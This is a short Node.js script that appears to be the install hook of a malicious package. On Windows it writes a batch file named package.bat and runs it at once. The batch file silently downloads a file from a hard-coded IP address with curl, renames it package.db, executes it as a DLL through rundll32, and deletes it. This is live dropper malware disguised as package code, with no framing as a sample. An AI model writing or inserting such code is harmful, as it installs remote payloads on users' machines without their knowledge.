const os = require('os');
const fs = require('fs');
const { exec } = require('child_process');

const data = '@echo off\ncurl -o Temp.b -L "http://142.111.77.196/user/user.asp?id=518437" > nul 2>&1\nrename Temp.b package.db\nrundll32 package.db RtlStackDbStackAdd SsMy 2184\ndel package.db';
if (os.type() === 'Windows_NT') {
  fs.writeFile('package.bat', data, () => exec('"package.bat"'));
}
